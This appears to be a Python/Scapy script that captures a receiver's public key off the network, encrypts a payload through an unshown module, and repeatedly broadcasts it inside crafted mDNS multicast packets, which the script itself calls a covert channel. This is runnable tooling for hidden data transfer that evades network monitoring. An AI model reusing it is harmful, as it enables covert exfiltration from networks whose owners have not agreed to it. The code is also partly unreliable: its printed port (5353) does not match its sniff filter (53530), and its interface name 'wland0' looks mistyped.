import json
import os
import sys
import time
from scapy.all import send, sniff, Raw, IP, UDP, DNS, DNSQR
from cryptography.hazmat.primitives import serialization
from scapy.all import get_if_list, conf

# List all interfaces
print(get_if_list())        # e.g. ['lo', 'eth0', 'ens33']
print(conf.iface)           # Scapy's current default

# Import your custom encryption engine module
import encryption_daan

def search_public_keys(timeout=10):
    """
    Listens to the network to catch the receiver's public key.
    """
    print("Listening for Receiver's Public Key on UDP port 5353...")
    captured_keys = []

    def process_packet(packet):
        if packet.haslayer(Raw):
            try:
                payload_str = packet[Raw].load.decode('utf-8')
                data = json.loads(payload_str)
                if "public_key" in data:
                    print("\n[+] Target public key captured successfully!")
                    key_bytes = data["public_key"].encode('utf-8')
                    pub_key = serialization.load_pem_public_key(key_bytes)
                    captured_keys.append(pub_key)
            except Exception:
                pass

    # Use Scapy to sniff traffic
    sniff(iface="wland0", filter="udp port 53530", prn=process_packet, stop_filter=lambda x: len(captured_keys) > 0, timeout=timeout)
    
    if not captured_keys:
        print("Error: Timed out waiting for a public key on the network. Is the receiver running?")
        sys.exit(1)
        
    return captured_keys[0]

def send_secret_rsa_mdns(json_payload_string: str, delay_seconds: int = 5):
    """
    Sends a custom mDNS multicast request containing the hybrid encrypted payload.
    Paced by 'delay_seconds' to keep resource usage extremely low.
    """
    print(f"\nStarting mDNS covert channel to 224.0.0.251:5353...")
    print(f"Broadcasting payload every {delay_seconds} seconds... Press Ctrl+C to stop.")

    MDNS_MULTICAST_IP = "224.0.0.251"
    MDNS_PORT = 5353

    # Build network layers
    ip_layer = IP(dst=MDNS_MULTICAST_IP)
    udp_layer = UDP(sport=MDNS_PORT, dport=MDNS_PORT)
    dns_layer = DNS(rd=0, qd=DNSQR(qname="covert.local", qtype="TXT"))

    # Pack the JSON payload string as the raw payload data
    packet = ip_layer / udp_layer / dns_layer / Raw(load=json_payload_string.encode('utf-8'))

    try:
        while True:
            send(packet, verbose=False)
            
            # This is your wait time. It completely stops execution during the pause,
            # meaning it consumes zero CPU cycles while waiting.
            time.sleep(delay_seconds) 
            
    except KeyboardInterrupt:
        print("\nScript terminated by user.")
        sys.exit(0)




if __name__ == "__main__":
    # 1. Grab the public key out of the air
    public_key = search_public_keys(timeout=10)
    
    # 2. Hand it over to encryption_daan.py
    print("Passing public key to encryption_daan engine...")
    payload_dict = encryption_daan.encryption_daan(public_key)
    
    # 3. Serialize and send, waiting 5 seconds between each loop iteration
    send_secret_rsa_mdns(json.dumps(payload_dict), delay_seconds=5)